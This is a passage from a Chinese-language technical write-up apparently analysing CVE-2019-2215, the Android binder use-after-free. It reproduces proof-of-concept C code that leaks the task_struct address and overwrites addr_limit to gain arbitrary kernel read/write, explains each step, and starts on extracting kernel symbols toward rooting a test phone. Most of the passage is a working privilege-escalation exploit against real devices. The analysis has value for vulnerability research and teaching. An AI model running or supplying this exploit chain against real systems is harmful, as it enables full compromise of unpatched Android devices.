            WRITE_ONCE(prev->next, next);
    }
可以看到调用链：`__remove_wait_queue` -> `list_del` -> `__list_del`
`list_del`的参数entry就是待删除的`task_list`，经过了`__list_del`函数的操作后，entry指向的`task_list`就从wait链表中取出了，过程如图：
而如果wait链表中只存在一项时（也就是head），就会变成这样：
此时prev和next指向了head自身，而head本身又是位于我们申请的`binder_thread`内存中，所以`p`和`n`泄露出了head的地址，也就是`binder_thread`中wait成员的地址。
现在可以来分析poc了：
    // size of struct binder_thread : 408Bytes = 0x198
    #define BINDER_THREAD_SZ 0x190
    // use struct iovec to refill the freed binder_thread
    // size of struct iovec is 16Bytes (64bit system)
    #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
    // offset of wait_queue in binder_thread
    #define WAITQUEUE_OFFSET 0xA0
    // finger out offset of wait_queue in iovec array
    #define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
    void leak_task_struct(void)
    {
      struct epoll_event event = { .events = EPOLLIN };
      if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
      struct iovec iovec_array[IOVEC_ARRAY_SZ];
      memset(iovec_array, 0, sizeof(iovec_array));
      iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
      iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;
      int b;
      int pipefd[2];
      if (pipe(pipefd)) err(1, "pipe");
      if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "pipe size");
      static char page_buffer[0x1000];
      //if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "fill pipe");
      pid_t fork_ret = fork();
      if (fork_ret == -1) err(1, "fork");
      if (fork_ret == 0){
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        printf("CHILD: Doing EPOLL_CTL_DEL.\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        printf("CHILD: Finished EPOLL_CTL_DEL.\n");
        // first page: dummy data
        if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
        close(pipefd[1]);
        printf("CHILD: Finished write to FIFO.\n");
        exit(0);
      }
      //printf("PARENT: Calling READV\n");
      ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
      b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
      printf("writev() returns 0x%x\n", (unsigned int)b);
      // second page: leaked data
      if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
      //hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));
      printf("PARENT: Finished calling READV\n");
      int status;
      if (wait(&status) != fork_ret) err(1, "wait");
      current_ptr = *(unsigned long *)(page_buffer + 0xe8);
      printf("current_ptr == 0x%lx\n", current_ptr);
    }
  * 进行`EPOLL_CTL_ADD`，添加对binder_fd的监听事件，同poc.c
  * 初始化`iovec_array`，并填充构造数据
  * 创建pipe并设定好buffer，用于之后父子进程通信
  * fork生成子进程，子进程一开始sleep了两秒，所以继续看父进程
  * 进行`BINDER_THREAD_EXIT`，此时`binder_thread`结构体已被释放
  * 父进程调用`writev`（因为`writev`的特性，`binder_thread`被free的内存由`iovce_array[IOVEC_ARRAY_SZ]`占位），从`iovec_array`读取数据写入`pipefd[1]`，根据`iovec_array`构造的数据可知，从`iovec_array[9]`及以前的内容都为0，所以`writev`从`iovec_array[10]`开始读取，也就是将`dummy_page_4g_aligned`指向的0x1000大小的无用数据写入管道中，由于管道大小也为0x1000所以`writev`阻塞，此时转到子进程
  * 由于`binder_thread`已被构造的数据占位，所以目前内存中的情况如下：
binder_thread struct | iovec_array  
---|---  
0x00: ... | 0x00: iovec_array[0].iov_len  
0x08: ... | 0x08: iovec_array[0].iov_base  
... | ...  
... | ...  
0xA0: wait.lock | 0xA0: iovec_array[10].iov_base (dummy_page_4g_aligned)  
0xA8: wait.task_list.next | 0xA8: iovec_array[10].iov_len (0x1000)  
0xB0: wait.task_list.prev | 0xB0: iovec_array[11].iov_base (0xDEADBEEF)  
0xB8: ... | 0xB8: iovec_array[11].iov_len (0x1000)  
... | ...  
... | ...  
  * 此时子进程调用`EPOLL_CTL_DEL`触发uaf，进入`remove_wait_queue`后`dummy_page_4g_aligned`绕过了自旋锁检查，进行删除链表项的操作时`wait.task_list.next`和`wait.task_list.prev`都指向自身(`wait.task_list`)，所以现在`iovec_array[10].iov_len`和`iovec_array[11].iov_base`都保存了泄露的地址
  * 然后子进程进行`read`操作，将刚才父进程写入的无用数据读出以解除父进程的阻塞状态，子进程结束，转到父进程
  * 父进程继续未完成的`writev`函数，将`iovec_array[11].iov_base`指向的0x1000大小的数据写入管道，而此时`iovec_array[11].iov_base`的数据已经在子进程中被覆盖为了泄露的wait地址，所以此时读取的是wait结构体之后的数据
  * 调用read函数，将读取到的数据保存到`page_buffer`中
  * 根据`task_struct`在`binder_thread`中的偏移，计算出`task_struct`的地址，保存在`current_ptr`中，函数结束
泄露过程:
### 覆盖addr_limit
直接开始分析：
    void clobber_addr_limit(void)
    {
      struct epoll_event event = { .events = EPOLLIN };
      if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
      struct iovec iovec_array[IOVEC_ARRAY_SZ];
      memset(iovec_array, 0, sizeof(iovec_array));
      unsigned long second_write_chunk[] = {
        1, /* iov_len */
        0xdeadbeef, /* iov_base (already used) */
        0x8 + 2 * 0x10, /* iov_len (already used) */
        current_ptr + 0x8, /* next iov_base (addr_limit) */
        8, /* next iov_len (sizeof(addr_limit)) */
        0xfffffffffffffffe /* value to write */
      };
      iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
      iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */
      int socks[2];
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
      if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");
      pid_t fork_ret = fork();
      if (fork_ret == -1) err(1, "fork");
      if (fork_ret == 0){
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        printf("CHILD: Doing EPOLL_CTL_DEL.\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        printf("CHILD: Finished EPOLL_CTL_DEL.\n");
        if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
          err(1, "write second chunk to socket");
        exit(0);
      }
      ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
      struct msghdr msg = {
        .msg_iov = iovec_array,
        .msg_iovlen = IOVEC_ARRAY_SZ
      };
      printf("PARENT: Doing recvmsg.\n");
      int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
      printf("PARENT recvmsg() returns %d, expected %lu\n", recvmsg_result,
          (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
          iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
          iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
    }
  * 进行`EPOLL_CTL_ADD`，相同的操作
  * 初始化`iovec_array`，构造数据
  * 初始化`second_write_chunk`，构造数据
  * `socketpair`初始化socket，并向`socks[1]`写入1字节
学习：[socketpair、recvmsg](https://blog.csdn.net/weixin_40039738/article/details/81095013)
  * fork生成子进程，`sleep(2)`，看父进程
  * 进行`BINDER_THREAD_EXIT`，此时`binder_thread`结构体已被释放
  * 调用`recvmsg`，读取之前写入socket的1字节，此时为第一次读取（recvmsg#1）
> `recvmsg`和writev都可以将用户空间的数据复制到内核空间，所以调用`recvmsg`时`binder_thread`的内存被占位
  * socket中没有更多数据可读取，此时父进程阻塞，转到子进程
  * 子进程调用`EPOLL_CTL_DEL`触发uaf，与之前的情况一样，`iovec_array[10].iov_len`和`iovec_array[11].iov_base`被改写为`wait.task_list`地址
  * 子进程调用`write`向`socket`写入`second_write_chunk`，此时socket中存在数据，父进程解除阻塞状态，子进程结束，转到父进程
  * 父进程根据`iovec_array[11].iov_len`读取0x28大小的数据到`iovec_array[11].iov_base`中，此时为第二次读取（recvmsg#2）
  * 由于`second_write_chunk`大小为0x30，所以`recvmsg`还要再读取8字节数据，也就是`second_write_chunk`最后8字节`0xfffffffffffffffe`，而此时`iovec_array[12].iov_base`已经在`recvmsg#2`操作中被覆盖为`current_ptr + 0x8`也就是`task_struct + 0x8`，这个地址即`addr_limit`的地址，所以在`recvmsg#3`读取后，`addr_limit`被覆盖为`0xfffffffffffffffe`，得到了任意地址读写的权限，函数结束
        // elixir.bootlin.com/linux/v5.5.19/source/include/linux/sched.h#L635
    // 链接中的linux版本高于测试机版本4.4.169是由于此网站的结构体定义普遍偏旧，在4.4版本中找不到相应的结构体定义，该版本的结构体定义符合测试机版本
    struct task_struct {
        #ifdef CONFIG_THREAD_INFO_IN_TASK
        /*
           * For reasons of header soup (see current_thread_info()), this
           * must be the first element of task_struct.
           */
        struct thread_info thread_info;
        #endif
        volatile long state;  /* -1 unrunnable, 0 runnable, >0 stopped */
        void *stack;
        atomic_t usage;
        unsigned int flags;   /* per process flags, defined below */
        unsigned int ptrace;
        ......
    }
    //elixir.bootlin.com/linux/v5.5.19/source/arch/arm64/include/asm/thread_info.h#L26
    struct thread_info {
        unsigned long     flags;      /* low level flags */
        mm_segment_t      addr_limit; /* address limit */
        #ifndef CONFIG_THREAD_INFO_IN_TASK
        struct task_struct    *task;      /* main task structure */
        #endif
        #ifdef CONFIG_ARM64_SW_TTBR0_PAN
        u64           ttbr0;      /* saved TTBR0_EL1 */
        #endif
        int           preempt_count;  /* 0 => preemptable,  bug */
        #ifndef CONFIG_THREAD_INFO_IN_TASK
        int           cpu;        /* cpu */
        #endif
    };
覆盖过程：
### 修改系统属性
修改内核内存中的数据首先要得到 **内核基址** 和 **内核符号信息**
，后者用来计算偏移。获取内核符号信息可以通过下载googlesource中的官方镜像然后用工具提取，也可以用已root的同型号同内核版本手机dump出内核信息来获取。以下采用的是通过官方镜像提取的办法。
  * 内核符号信息
根据[poc3.c wp](https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/)提供的方法，获取符号信息过程如下：
    1. google测试机内核版本，本测试机为`4.4.169-gee9976dde895`，搜索结果中找到[wahoo-kernel repo](https://android.googlesource.com/device/google/wahoo-kernel/+/fcd2db0f91051deca2cccdaaa937954b39ca5cda)，下载文件`Image.lz4-dtb`（右下角的txt下载，base64解码得到原文件，记得改后缀）
    2. 解压下载的文件
                $ lz4 -d Image.lz4-dtb Image
        Stream followed by unrecognized data
        Successfully decoded 37500928 bytes
        $ strings Image | grep "Linux version"
        Linux version 4.4.169-gee9976dde895 (android-build@abfarm325) (Android clang version 5.0.300080 (based on LLVM 5.0.300080)) #1 SMP PREEMPT Wed Mar 6 01:42:27 UTC 2019
    3. 使用[droidimg](https://github.com/nforest/droidimg)导出符号表，可能会遇到下面的报错：在寻找kallsyms table时出错
                $ ./vmlinux.py Image
        Linux version 4.4.169-gee9976dde895 (android-build@abfarm325) (Android clang version 5.0.300080 (based on LLVM 5.0.300080)) #1 SMP PREEMPT Wed Mar 6 01:42:27 UTC 2019